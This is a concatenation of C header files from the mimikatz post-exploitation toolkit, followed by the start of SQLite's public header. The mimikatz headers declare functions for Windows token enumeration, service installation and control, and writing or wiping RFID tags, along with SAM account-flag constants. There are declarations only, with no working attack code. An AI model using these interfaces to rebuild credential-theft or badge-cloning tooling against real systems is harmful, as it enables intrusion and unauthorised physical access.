#define USER_ALL_USERNAME				0x00000001
#define USER_ALL_FULLNAME				0x00000002
#define USER_ALL_USERID					0x00000004
#define USER_ALL_PRIMARYGROUPID			0x00000008
#define USER_ALL_ADMINCOMMENT			0x00000010
#define USER_ALL_USERCOMMENT			0x00000020
#define USER_ALL_HOMEDIRECTORY			0x00000040
#define USER_ALL_HOMEDIRECTORYDRIVE		0x00000080
#define USER_ALL_SCRIPTPATH				0x00000100
#define USER_ALL_PROFILEPATH			0x00000200
#define USER_ALL_WORKSTATIONS			0x00000400
#define USER_ALL_LASTLOGON				0x00000800
#define USER_ALL_LASTLOGOFF				0x00001000
#define USER_ALL_LOGONHOURS				0x00002000
#define USER_ALL_BADPASSWORDCOUNT		0x00004000
#define USER_ALL_LOGONCOUNT				0x00008000
#define USER_ALL_PASSWORDCANCHANGE		0x00010000
#define USER_ALL_PASSWORDMUSTCHANGE		0x00020000
#define USER_ALL_PASSWORDLASTSET		0x00040000
#define USER_ALL_ACCOUNTEXPIRES			0x00080000
#define USER_ALL_USERACCOUNTCONTROL		0x00100000
#define USER_ALL_PARAMETERS				0x00200000
#define USER_ALL_COUNTRYCODE			0x00400000
#define USER_ALL_CODEPAGE				0x00800000
#define USER_ALL_NTPASSWORDPRESENT		0x01000000
#define USER_ALL_LMPASSWORDPRESENT		0x02000000
#define USER_ALL_PRIVATEDATA			0x04000000
#define USER_ALL_PASSWORDEXPIRED		0x08000000
#define USER_ALL_SECURITYDESCRIPTOR		0x10000000
#define USER_ALL_UNDEFINED_MASK			0xc0000000

#define USER_NORMAL_ACCOUNT				0x00000010
#define USER_DONT_EXPIRE_PASSWORD		0x00000200

//
// Special Values and Constants - User
//

//
//  Bit masks for field usriX_flags of USER_INFO_X (X = 0/1).
//

#define UF_SCRIPT							0x0001
#define UF_ACCOUNTDISABLE					0x0002
#define UF_HOMEDIR_REQUIRED					0x0008
#define UF_LOCKOUT							0x0010
#define UF_PASSWD_NOTREQD					0x0020
#define UF_PASSWD_CANT_CHANGE				0x0040
#define UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED	0x0080

//
// Account type bits as part of usri_flags.
//

#define UF_TEMP_DUPLICATE_ACCOUNT			0x0100
#define UF_NORMAL_ACCOUNT					0x0200
#define UF_INTERDOMAIN_TRUST_ACCOUNT		0x0800
#define UF_WORKSTATION_TRUST_ACCOUNT		0x1000
#define UF_SERVER_TRUST_ACCOUNT				0x2000

#define UF_MACHINE_ACCOUNT_MASK	( UF_INTERDOMAIN_TRUST_ACCOUNT | UF_WORKSTATION_TRUST_ACCOUNT | UF_SERVER_TRUST_ACCOUNT ) // !!!

#define UF_ACCOUNT_TYPE_MASK	( UF_TEMP_DUPLICATE_ACCOUNT | UF_NORMAL_ACCOUNT | UF_INTERDOMAIN_TRUST_ACCOUNT | UF_WORKSTATION_TRUST_ACCOUNT | UF_SERVER_TRUST_ACCOUNT ) // !!!

#define UF_DONT_EXPIRE_PASSWD				0x10000
#define UF_MNS_LOGON_ACCOUNT				0x20000
#define UF_SMARTCARD_REQUIRED				0x40000
#define UF_TRUSTED_FOR_DELEGATION			0x80000
#define UF_NOT_DELEGATED					0x100000
#define UF_USE_DES_KEY_ONLY					0x200000
#define UF_DONT_REQUIRE_PREAUTH				0x400000
#define UF_PASSWORD_EXPIRED					0x800000
#define UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION	0x1000000
#define UF_NO_AUTH_DATA_REQUIRED			0x2000000
#define UF_PARTIAL_SECRETS_ACCOUNT			0x4000000
#define UF_USE_AES_KEYS						0x8000000



#define UF_SETTABLE_BITS	( \
	UF_SCRIPT | \
	UF_ACCOUNTDISABLE | \
	UF_LOCKOUT | \
	UF_HOMEDIR_REQUIRED  | \
	UF_PASSWD_NOTREQD | \
	UF_PASSWD_CANT_CHANGE | \
	UF_ACCOUNT_TYPE_MASK | \
	UF_DONT_EXPIRE_PASSWD | \
	UF_MNS_LOGON_ACCOUNT |\
	UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED |\
	UF_SMARTCARD_REQUIRED | \
	UF_TRUSTED_FOR_DELEGATION | \
	UF_NOT_DELEGATED | \
	UF_USE_DES_KEY_ONLY  | \
	UF_DONT_REQUIRE_PREAUTH |\
	UF_PASSWORD_EXPIRED |\
	UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION |\
	UF_NO_AUTH_DATA_REQUIRED \
) // !!!

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"


BOOL kull_m_service_getUniqueForName(PCWSTR serviceName, SERVICE_STATUS_PROCESS * pServiceStatusProcess);

BOOL kull_m_service_start(PCWSTR serviceName);
BOOL kull_m_service_remove(PCWSTR serviceName);
BOOL kull_m_service_stop(PCWSTR serviceName);
BOOL kull_m_service_suspend(PCWSTR serviceName);
BOOL kull_m_service_resume(PCWSTR serviceName);
BOOL kull_m_service_preshutdown(PCWSTR serviceName);
BOOL kull_m_service_shutdown(PCWSTR serviceName);

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus);
BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle);
BOOL kull_m_service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt);
BOOL kull_m_service_uninstall(PCWSTR serviceName);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_string.h"
//#include "kull_m_hid.h"

#define SR98_SLEEP_BEFORE_SEND				100
#define SR98_SLEEP_BEFORE_RECV				100

#define SR98_RATE_RF_32						0
#define SR98_RATE_RF_64						1

#define SR98_T5577_LOCKBIT_MASK				0x80


#define SR98_IOCTL_SUPPORT_CARD				0
#define SR98_IOCTL_TEST_DEVICE				1
#define SR98_IOCTL_BEEP						3

#define SR98_IOCTL_EEPROM_READ				4
#define SR98_IOCTL_EEPROM_WRITE				5
#define SR98_IOCTL_EEPROM_GET				6
#define SR98_IOCTL_EEPROM_SET				7

#define SR98_IOCTL_EMID_READ				16

#define SR98_IOCTL_T5577					18
#define SR98_SUB_IOCTL_T5577_RESET				0
#define SR98_SUB_IOCTL_T5577_READ_CURRENT		1
#define SR98_SUB_IOCTL_T5577_READ_PAGE			2
#define SR98_SUB_IOCTL_T5577_READ_BLOCK			3
#define SR98_SUB_IOCTL_T5577_WRITE_BLOCK		4
#define SR98_SUB_IOCTL_T5577_READ_BLOCK_PASS	5
#define SR98_SUB_IOCTL_T5577_WRITE_BLOCK_PASS	6
#define SR98_SUB_IOCTL_T5577_WAKEUP				7

#define SR98_IOCTL_EM4305					19
#define SR98_SUB_IOCTL_EM4305_WRITE_WORD		1
#define SR98_SUB_IOCTL_EM4305_READ_WORD			2
#define SR98_SUB_IOCTL_EM4305_LOGIN				3
#define SR98_SUB_IOCTL_EM4305_PROTECT			4
#define SR98_SUB_IOCTL_EM4305_DISABLE			5

#define SR98_IOCTL_EL8625A					20
#define SR98_SUB_IOCTL_EL8625A_RESET			0				
#define SR98_SUB_IOCTL_EL8625A_WRITE_EMID		1
#define SR98_SUB_IOCTL_EL8625A_RF_STOP			2
#define SR98_SUB_IOCTL_EL8625A_RF_START			3
#define SR98_SUB_IOCTL_EL8625A_WRITE_EMID_PASS	4

#define SR98_IOCTL_MF1_PCD_RESET			32
#define SR98_IOCTL_MF1_TYPEA_GET_UID		33
#define SR98_IOCTL_MF1_TYPEA_REQUEST		34
#define SR98_IOCTL_MF1_TYPEA_ANTICOLL		35
#define SR98_IOCTL_MF1_TYPEA_SELECT			36
#define SR98_IOCTL_MF1_TYPEA_HOST_AUTHKEY	37
#define SR98_IOCTL_MF1_TYPEA_BLOCK_READ		38
#define SR98_IOCTL_MF1_TYPEA_BLOCK_WRITE	39
#define SR98_IOCTL_MF1_TYPEA_HALT			40
#define SR98_IOCTL_MF1_ANTENNA				41
#define SR98_IOCTL_MF1_PCD_TRANSCEIVE_BYTES	42
#define SR98_IOCTL_MF1_PCD_TRANSCEIVE_BITS	43

typedef struct _SR98_DEVICE {
	struct _SR98_DEVICE * next;
	DWORD id;
	PWCHAR DevicePath;
	HIDD_ATTRIBUTES hidAttributes;
	HIDP_CAPS hidCaps;
	HANDLE hDevice;
} SR98_DEVICE, *PSR98_DEVICE;

BOOL sr98_test_device(HANDLE hFile);
BOOL sr98_beep(HANDLE hFile, BYTE duration);
BOOL sr98_read_emid(HANDLE hFile, BYTE emid[5]);

BOOL sr98_t5577_reset(HANDLE hFile, BYTE DataRate);
BOOL sr98_t5577_write_block(HANDLE hFile, BYTE page, BYTE block, DWORD data, BYTE isPassword, DWORD password/*, BYTE lockBit*/);
BOOL sr98_t5577_wipe(HANDLE hFile, BOOL resetAfter);

BOOL sr98_send_receive(HANDLE hFile, BYTE ctl, LPCVOID in, BYTE szIn, LPBYTE *out, BYTE *szOut);
BOOL sr98_devices_get(PSR98_DEVICE *devices, DWORD *count);
void sr98_devices_free(PSR98_DEVICE devices);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"


#define DECLARE_UNICODE_STRING(_var, _string) \
const WCHAR _var ## _buffer[] = _string; \
UNICODE_STRING _var = { sizeof(_string) - sizeof(WCHAR), sizeof(_string), (PWCH) _var ## _buffer }

#define DECLARE_CONST_UNICODE_STRING(_var, _string) \
const WCHAR _var ## _buffer[] = _string; \
const UNICODE_STRING _var = { sizeof(_string) - sizeof(WCHAR), sizeof(_string), (PWCH) _var ## _buffer }

extern VOID WINAPI RtlInitString(OUT PSTRING DestinationString, IN PCSZ SourceString);
extern VOID WINAPI RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString);

extern NTSTATUS WINAPI RtlAnsiStringToUnicodeString(OUT PUNICODE_STRING DestinationString, IN PCANSI_STRING SourceString, IN BOOLEAN AllocateDestinationString);
extern NTSTATUS WINAPI RtlUnicodeStringToAnsiString(OUT PANSI_STRING DestinationString, IN PCUNICODE_STRING SourceString, IN BOOLEAN AllocateDestinationString);

extern VOID WINAPI RtlUpperString(OUT PSTRING DestinationString, IN const STRING *SourceString);
extern NTSTATUS WINAPI RtlUpcaseUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCUNICODE_STRING SourceString, IN BOOLEAN AllocateDestinationString);
extern NTSTATUS WINAPI RtlDowncaseUnicodeString(PUNICODE_STRING DestinationString, IN PCUNICODE_STRING SourceString, IN BOOLEAN AllocateDestinationString);
extern WCHAR WINAPI RtlUpcaseUnicodeChar(IN WCHAR SourceCharacter);
extern NTSTATUS WINAPI RtlUpcaseUnicodeStringToOemString(IN OUT POEM_STRING DestinationString, IN PCUNICODE_STRING SourceString, IN BOOLEAN AllocateDestinationString);

extern BOOLEAN WINAPI RtlEqualString(IN const STRING *String1, IN const STRING *String2, IN BOOLEAN CaseInSensitive);
extern BOOLEAN WINAPI RtlEqualUnicodeString(IN PCUNICODE_STRING String1, IN PCUNICODE_STRING String2, IN BOOLEAN CaseInSensitive);

extern LONG WINAPI RtlCompareUnicodeString(IN PCUNICODE_STRING String1, IN PCUNICODE_STRING String2, IN BOOLEAN CaseInSensitive);
extern LONG WINAPI RtlCompareString(IN const STRING *String1, IN const STRING *String2, IN BOOLEAN CaseInSensitive);

extern VOID WINAPI RtlFreeAnsiString(IN OUT PANSI_STRING AnsiString);
extern VOID WINAPI RtlFreeUnicodeString(IN OUT PUNICODE_STRING UnicodeString);
extern VOID WINAPI RtlFreeOemString(IN OUT POEM_STRING OemString);

extern NTSTATUS WINAPI RtlStringFromGUID(IN LPCGUID Guid, PUNICODE_STRING UnicodeString);
extern NTSTATUS WINAPI RtlGUIDFromString(IN PCUNICODE_STRING GuidString, OUT GUID *Guid);
extern NTSTATUS NTAPI RtlValidateUnicodeString(IN ULONG Flags, IN PCUNICODE_STRING UnicodeString);

extern NTSTATUS WINAPI RtlAppendUnicodeStringToString(IN OUT PUNICODE_STRING Destination, IN PCUNICODE_STRING Source);

extern VOID NTAPI RtlRunDecodeUnicodeString(IN BYTE Hash, IN OUT PUNICODE_STRING String);
extern VOID NTAPI RtlRunEncodeUnicodeString(IN OUT PBYTE Hash, IN OUT PUNICODE_STRING String);

//BOOL kull_m_string_suspectUnicodeStringStructure(IN PUNICODE_STRING pUnicodeString);
void kull_m_string_MakeRelativeOrAbsoluteString(PVOID BaseAddress, PLSA_UNICODE_STRING String, BOOL relative);
BOOL kull_m_string_copyUnicodeStringBuffer(PUNICODE_STRING pSource, PUNICODE_STRING pDestination);
void kull_m_string_freeUnicodeStringBuffer(PUNICODE_STRING pString);
BOOL kull_m_string_suspectUnicodeString(IN PUNICODE_STRING pUnicodeString);
void kull_m_string_printSuspectUnicodeString(PVOID data, DWORD size);

wchar_t * kull_m_string_qad_ansi_to_unicode(const char * ansi);
wchar_t * kull_m_string_qad_ansi_c_to_unicode(const char * ansi, SIZE_T szStr);
char * kull_m_string_unicode_to_ansi(const wchar_t * unicode);
BOOL kull_m_string_stringToHex(IN LPCWCHAR string, IN LPBYTE hex, IN DWORD size);
BOOL kull_m_string_stringToHexBuffer(IN LPCWCHAR string, IN LPBYTE *hex, IN DWORD *size);

void kull_m_string_wprintf_hex(LPCVOID lpData, DWORD cbData, DWORD flags);
__time32_t kull_m_string_get_time32(__time32_t * _Time);
void kull_m_string_displayFileTime(IN PFILETIME pFileTime);
void kull_m_string_displayLocalFileTime(IN PFILETIME pFileTime);
BOOL kull_m_string_FileTimeToString(IN PFILETIME pFileTime, OUT WCHAR string[14 + 1]);
void kull_m_string_displayGUID(IN LPCGUID pGuid);
void kull_m_string_displaySID(IN PSID pSid);
PWSTR kull_m_string_getRandomGUID();
void kull_m_string_ptr_replace(PVOID ptr, DWORD64 size);

BOOL kull_m_string_args_byName(const int argc, const wchar_t * argv[], const wchar_t * name, const wchar_t ** theArgs, const wchar_t * defaultValue);
BOOL kull_m_string_args_bool_byName(int argc, wchar_t * argv[], LPCWSTR name, PBOOL value);
BOOL kull_m_string_copy_len(LPWSTR *dst, LPCWSTR src, size_t size);
BOOL kull_m_string_copy(LPWSTR *dst, LPCWSTR src);
BOOL kull_m_string_copyA_len(LPSTR *dst, LPCSTR src, size_t size);
BOOL kull_m_string_copyA(LPSTR *dst, LPCSTR src);
PWSTR kull_m_string_unicode_to_string(PCUNICODE_STRING src);
BOOL kull_m_string_quickxml_simplefind(LPCWSTR xml, LPCWSTR node, LPWSTR *dst);
#if !defined(MIMIKATZ_W2000_SUPPORT)
BOOL kull_m_string_quick_base64_to_Binary(PCWSTR base64, PBYTE *data, DWORD *szData);
BOOL kull_m_string_quick_base64_to_BinaryA(PCSTR base64, PBYTE *data, DWORD *szData);
BOOL kull_m_string_quick_urlsafe_base64_to_Binary(PCWSTR badBase64, PBYTE *data, DWORD *szData);
BOOL kull_m_string_quick_urlsafe_base64_to_BinaryA(PCSTR badBase64, PBYTE *data, DWORD *szData);
BOOL kull_m_string_quick_binary_to_base64A(const BYTE *pbData, const DWORD cbData, LPSTR *base64);
BOOL kull_m_string_quick_binary_to_urlsafe_base64A(const BYTE *pbData, const DWORD cbData, LPSTR *badBase64);
BOOL kull_m_string_EncodeB64_headersA(LPCSTR type, const PBYTE pbData, const DWORD cbData, LPSTR *out);
#endif
BOOL kull_m_string_sprintf(PWSTR *outBuffer, PCWSTR format, ...);
BOOL kull_m_string_sprintfA(PSTR *outBuffer, PCSTR format, ...);
BOOL kull_m_string_stringToFileTime(LPCWSTR string, PFILETIME filetime);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_handle.h"


extern NTSTATUS NTAPI NtCompareTokens(IN HANDLE FirstTokenHandle, IN HANDLE SecondTokenHandle, OUT PBOOLEAN Equal);

typedef BOOL (CALLBACK * PKULL_M_TOKEN_ENUM_CALLBACK) (HANDLE hToken, DWORD ptid, PVOID pvArg);

typedef struct _KULL_M_TOKEN_ENUM_DATA {
	PKULL_M_TOKEN_ENUM_CALLBACK callback;
	PVOID pvArg;
	BOOL mustContinue;
} KULL_M_TOKEN_ENUM_DATA, *PKULL_M_TOKEN_ENUM_DATA;

typedef struct _KULL_M_TOKEN_LIST {
	HANDLE hToken;
	DWORD ptid;
	struct _KULL_M_TOKEN_LIST *next;
} KULL_M_TOKEN_LIST, *PKULL_M_TOKEN_LIST;

BOOL kull_m_token_getTokens(PKULL_M_TOKEN_ENUM_CALLBACK callBack, PVOID pvArg);
BOOL kull_m_token_getTokensUnique(PKULL_M_TOKEN_ENUM_CALLBACK callBack, PVOID pvArg);
BOOL CALLBACK kull_m_token_getTokensUnique_callback(HANDLE hToken, DWORD ptid, PVOID pvArg);
BOOL CALLBACK kull_m_token_getTokens_process_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
BOOL CALLBACK kull_m_token_getTokens_handles_callback(HANDLE handle, PSYSTEM_HANDLE pSystemHandle, PVOID pvArg);

BOOL kull_m_token_getNameDomainFromToken(HANDLE hToken, PWSTR * pName, PWSTR * pDomain, PWSTR * pSid, PSID_NAME_USE pSidNameUse);
BOOL kull_m_token_CheckTokenMembership(__in_opt HANDLE TokenHandle, __in PSID SidToCheck, __out PBOOL IsMember);
PCWCHAR kull_m_token_getSidNameUse(SID_NAME_USE SidNameUse);
BOOL kull_m_token_getNameDomainFromSID(PSID pSid, PWSTR * pName, PWSTR * pDomain, PSID_NAME_USE pSidNameUse, LPCWSTR system);
BOOL kull_m_token_getSidDomainFromName(PCWSTR pName, PSID * pSid, PWSTR * pDomain, PSID_NAME_USE pSidNameUse, LPCWSTR system);

BOOL kull_m_token_equal(IN HANDLE First, IN HANDLE Second);
PTOKEN_USER kull_m_token_getUserFromToken(HANDLE hToken);
PWSTR kull_m_token_getSidFromToken(HANDLE hToken);
PWSTR kull_m_token_getCurrentSid();
BOOL kull_m_token_isLocalAccount(__in_opt HANDLE TokenHandle, __out PBOOL IsMember);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"

//#include "kull_m_string.h"

IXMLDOMDocument * kull_m_xml_CreateAndInitDOM();
void kull_m_xml_ReleaseDom(IXMLDOMDocument *pDoc);

BOOL kull_m_xml_LoadXMLFile(IXMLDOMDocument *pXMLDom, PCWSTR filename);
BOOL kull_m_xml_SaveXMLFile(IXMLDOMDocument *pXMLDom, PCWSTR filename);

wchar_t * kull_m_xml_getAttribute(IXMLDOMNode *pNode, PCWSTR name);
wchar_t * kull_m_xml_getTextValue(IXMLDOMNode *pNode, PCWSTR name);

/*
** 2001-09-15
**
** The author disclaims copyright to this source code.  In place of
** a legal notice, here is a blessing:
**
**    May you do good and not evil.
**    May you find forgiveness for yourself and forgive others.
**    May you share freely, never taking more than you give.
**
*************************************************************************
** This header file defines the interface that the SQLite library
** presents to client programs.  If a C-function, structure, datatype,
** or constant definition does not appear in this file, then it is
** not a published API of SQLite, is subject to change without
** notice, and should not be referenced by programs that use SQLite.
**
** Some of the definitions that are in this file are marked as
** "experimental".  Experimental interfaces are normally new
** features recently added to SQLite.  We do not anticipate changes
** to experimental interfaces but reserve the right to make minor changes
** if experience from use "in the wild" suggest such changes are prudent.
**
** The official C-language API documentation for SQLite is derived
** from comments in this file.  This file is the authoritative source
** on how SQLite interfaces are supposed to operate.
**
** The name of this file under configuration management is "sqlite.h.in".
** The makefile makes some minor changes to this file (such as inserting
** the version number) and changes its name to "sqlite3.h" as
** part of the build process.
*/
#ifndef SQLITE3_H
#define SQLITE3_H
#include <stdarg.h>     /* Needed for the definition of va_list */

/*
** Make sure we can call this stuff from C++.
*/
#ifdef __cplusplus
extern "C" {
#endif


/*
** Provide the ability to override linkage features of the interface.
*/
#ifndef SQLITE_EXTERN
# define SQLITE_EXTERN extern
#endif
#ifndef SQLITE_API
# define SQLITE_API
#endif
#ifndef SQLITE_CDECL
# define SQLITE_CDECL
#endif
#ifndef SQLITE_APICALL
# define SQLITE_APICALL
#endif
#ifndef SQLITE_STDCALL
# define SQLITE_STDCALL SQLITE_APICALL
#endif
#ifndef SQLITE_CALLBACK
# define SQLITE_CALLBACK
#endif
#ifndef SQLITE_SYSAPI
# define SQLITE_SYSAPI
#endif

/*
** These no-op macros are used in front of interfaces to mark those
** interfaces as either deprecated or experimental.  New applications
** should not use deprecated interfaces - they are supported for backwards
** compatibility only.  Application writers should be aware that
** experimental interfaces are subject to change in point releases.
**
** These macros used to resolve to various kinds of compiler magic that
** would generate warning messages when they were used.  But that
** compiler magic ended up generating such a flurry of bug reports
** that we have taken it all out and gone back to using simple
** noop macros.
*/
#define SQLITE_DEPRECATED
#define SQLITE_EXPERIMENTAL

/*
** Ensure these symbols were not defined by some previous header file.
*/
#ifdef SQLITE_VERSION
# undef SQLITE_VERSION
#endif
#ifdef SQLITE_VERSION_NUMBER
# undef SQLITE_VERSION_NUMBER
#endif

/*
** CAPI3REF: Compile-Time Library Version Numbers
**
** ^(The [SQLITE_VERSION] C preprocessor macro in the sqlite3.h header
** evaluates to a string literal that is the SQLite version in the
** format "X.Y.Z" where X is the major version number (always 3 for
** SQLite3) and Y is the minor version number and Z is the release number.)^
** ^(The [SQLITE_VERSION_NUMBER] C preprocessor macro resolves to an integer
** with the value (X*1000000 + Y*1000 + Z) where X, Y, and Z are the same
** numbers used in [SQLITE_VERSION].)^
** The SQLITE_VERSION_NUMBER for any given release of SQLite will also
** be larger than the release from which it is derived.  Either Y will
** be held constant and Z will be incremented or else Y will be incremented
** and Z will be reset to zero.
**
** Since [version 3.6.18] ([dateof:3.6.18]), 
** SQLite source code has been stored in the
** <a href="http://www.fossil-scm.org/">Fossil configuration management
** system</a>.  ^The SQLITE_SOURCE_ID macro evaluates to
** a string which identifies a particular check-in of SQLite
** within its configuration management system.  ^The SQLITE_SOURCE_ID
** string contains the date and time of the check-in (UTC) and a SHA1
** or SHA3-256 hash of the entire source tree.  If the source code has
** been edited in any way since it was last checked in, then the last
** four hexadecimal digits of the hash may be modified.
**
** See also: [sqlite3_libversion()],
** [sqlite3_libversion_number()], [sqlite3_sourceid()],
** [sqlite_version()] and [sqlite_source_id()].
*/
#define SQLITE_VERSION        "3.30.1"
#define SQLITE_VERSION_NUMBER 3030001
#define SQLITE_SOURCE_ID      "2019-10-10 20:19:45 18db032d058f1436ce3dea84081f4ee5a0f2259ad97301d43c426bc7f3df1b0b"

/*
** CAPI3REF: Run-Time Library Version Numbers
** KEYWORDS: sqlite3_version sqlite3_sourceid
**
** These interfaces provide the same information as the [SQLITE_VERSION],
** [SQLITE_VERSION_NUMBER], and [SQLITE_SOURCE_ID] C preprocessor macros
** but are associated with the library instead of the header file.  ^(Cautious
** programmers might include assert() statements in their application to
** verify that values returned by these interfaces match the macros in
** the header, and thus ensure that the application is
** compiled with matching library and header files.
**
** <blockquote><pre>
** assert( sqlite3_libversion_number()==SQLITE_VERSION_NUMBER );
** assert( strncmp(sqlite3_sourceid(),SQLITE_SOURCE_ID,80)==0 );
** assert( strcmp(sqlite3_libversion(),SQLITE_VERSION)==0 );
** </pre></blockquote>)^
**
** ^The sqlite3_version[] string constant contains the text of [SQLITE_VERSION]
** macro.  ^The sqlite3_libversion() function returns a pointer to the
** to the sqlite3_version[] string constant.  The sqlite3_libversion()
** function is provided for use in DLLs since DLL users usually do not have
** direct access to string constants within the DLL.  ^The
** sqlite3_libversion_number() function returns an integer equal to
** [SQLITE_VERSION_NUMBER].  ^(The sqlite3_sourceid() function returns 
** a pointer to a string constant whose value is the same as the 
** [SQLITE_SOURCE_ID] C preprocessor macro.  Except if SQLite is built
** using an edited copy of [the amalgamation], then the last four characters
** of the hash might be different from [SQLITE_SOURCE_ID].)^
**
** See also: [sqlite_version()] and [sqlite_source_id()].
*/
SQLITE_API SQLITE_EXTERN const char sqlite3_version[];
SQLITE_API const char *sqlite3_libversion(void);
SQLITE_API const char *sqlite3_sourceid(void);
SQLITE_API int sqlite3_libversion_number(void);

/*
** CAPI3REF: Run-Time Library Compilation Options Diagnostics
**
** ^The sqlite3_compileoption_used() function returns 0 or 1 
** indicating whether the specified option was defined at 
** compile time.  ^The SQLITE_ prefix may be omitted from the 
** option name passed to sqlite3_compileoption_used().  
**
** ^The sqlite3_compileoption_get() function allows iterating
** over the list of options that were defined at compile time by
** returning the N-th compile time option string.  ^If N is out of range,
** sqlite3_compileoption_get() returns a NULL pointer.  ^The SQLITE_ 
** prefix is omitted from any strings returned by 
** sqlite3_compileoption_get().
**
** ^Support for the diagnostic functions sqlite3_compileoption_used()
** and sqlite3_compileoption_get() may be omitted by specifying the 
** [SQLITE_OMIT_COMPILEOPTION_DIAGS] option at compile time.
**
** See also: SQL functions [sqlite_compileoption_used()] and
** [sqlite_compileoption_get()] and the [compile_options pragma].
*/
#ifndef SQLITE_OMIT_COMPILEOPTION_DIAGS
SQLITE_API int sqlite3_compileoption_used(const char *zOptName);
SQLITE_API const char *sqlite3_compileoption_get(int N);
#else
# define sqlite3_compileoption_used(X) 0
# define sqlite3_compileoption_get(X)  ((void*)0)
#endif

/*
** CAPI3REF: Test To See If The Library Is Threadsafe
**
** ^The sqlite3_threadsafe() function returns zero if and only if
** SQLite was compiled with mutexing code omitted due to the
** [SQLITE_THREADSAFE] compile-time option being set to 0.
**
** SQLite can be compiled with or without mutexes.  When
** the [SQLITE_THREADSAFE] C preprocessor macro is 1 or 2, mutexes
** are enabled and SQLite is threadsafe.  When the
** [SQLITE_THREADSAFE] macro is 0, 
** the mutexes are omitted.  Without the mutexes, it is not safe
** to use SQLite concurrently from more than one thread.
**
** Enabling mutexes incurs a measurable performance penalty.
** So if speed is of utmost importance, it makes sense to disable
** the mutexes.  But for maximum safety, mutexes should be enabled.
** ^The default behavior is for mutexes to be enabled.
**
** This interface can be used by an application to make sure that the
** version of SQLite that it is linking against was compiled with
** the desired setting of the [SQLITE_THREADSAFE] macro.
**
** This interface only reports on the compile-time mutex setting
** of the [SQLITE_THREADSAFE] flag.  If SQLite is compiled with
** SQLITE_THREADSAFE=1 or =2 then mutexes are enabled by default but
** can be fully or partially disabled using a call to [sqlite3_config()]
** with the verbs [SQLITE_CONFIG_SINGLETHREAD], [SQLITE_CONFIG_MULTITHREAD],
** or [SQLITE_CONFIG_SERIALIZED].  ^(The return value of the
** sqlite3_threadsafe() function shows only the compile-time setting of
** thread safety, not any run-time changes to that setting made by
** sqlite3_config(). In other words, the return value from sqlite3_threadsafe()
** is unchanged by calls to sqlite3_config().)^
**
** See the [threading mode] documentation for additional information.
*/
SQLITE_API int sqlite3_threadsafe(void);

/*
** CAPI3REF: Database Connection Handle
** KEYWORDS: {database connection} {database connections}
**
** Each open SQLite database is represented by a pointer to an instance of
** the opaque structure named "sqlite3".  It is useful to think of an sqlite3
** pointer as an object.  The [sqlite3_open()], [sqlite3_open16()], and
** [sqlite3_open_v2()] interfaces are its constructors, and [sqlite3_close()]
** and [sqlite3_close_v2()] are its destructors.  There are many other
** interfaces (such as
** [sqlite3_prepare_v2()], [sqlite3_create_function()], and
** [sqlite3_busy_timeout()] to name but three) that are methods on an
** sqlite3 object.
*/
typedef struct sqlite3 sqlite3;

/*
** CAPI3REF: 64-Bit Integer Types
** KEYWORDS: sqlite_int64 sqlite_uint64
**
** Because there is no cross-platform way to specify 64-bit integer types
** SQLite includes typedefs for 64-bit signed and unsigned integers.
**
** The sqlite3_int64 and sqlite3_uint64 are the preferred type definitions.
** The sqlite_int64 and sqlite_uint64 types are supported for backwards
** compatibility only.
**
** ^The sqlite3_int64 and sqlite_int64 types can store integer values
** between -9223372036854775808 and +9223372036854775807 inclusive.  ^The
** sqlite3_uint64 and sqlite_uint64 types can store integer values 
** between 0 and +18446744073709551615 inclusive.
*/
#ifdef SQLITE_INT64_TYPE
  typedef SQLITE_INT64_TYPE sqlite_int64;
# ifdef SQLITE_UINT64_TYPE
    typedef SQLITE_UINT64_TYPE sqlite_uint64;
# else  
    typedef unsigned SQLITE_INT64_TYPE sqlite_uint64;
# endif
#elif defined(_MSC_VER) || defined(__BORLANDC__)
  typedef __int64 sqlite_int64;
  typedef unsigned __int64 sqlite_uint64;
#else
  typedef long long int sqlite_int64;
  typedef unsigned long long int sqlite_uint64;
#endif
typedef sqlite_int64 sqlite3_int64;
typedef sqlite_uint64 sqlite3_uint64;

/*
** If compiling for a processor that lacks floating point support,
** substitute integer for floating-point.
*/
#ifdef SQLITE_OMIT_FLOATING_POINT
# define double sqlite3_int64
#endif

/*
** CAPI3REF: Closing A Database Connection
** DESTRUCTOR: sqlite3
**
** ^The sqlite3_close() and sqlite3_close_v2() routines are destructors
** for the [sqlite3] object.
** ^Calls to sqlite3_close() and sqlite3_close_v2() return [SQLITE_OK] if
** the [sqlite3] object is successfully destroyed and all associated
** resources are deallocated.
**
** ^If the database connection is associated with unfinalized prepared
** statements or unfinished sqlite3_backup objects then sqlite3_close()
** will leave the database connection open and return [SQLITE_BUSY].
** ^If sqlite3_close_v2() is called with unfinalized prepared statements
** and/or unfinished sqlite3_backups, then the database connection becomes
** an unusable "zombie" which will automatically be deallocated when the
** last prepared statement is finalized or the last sqlite3_backup is
** finished.  The sqlite3_close_v2() interface is intended for use with
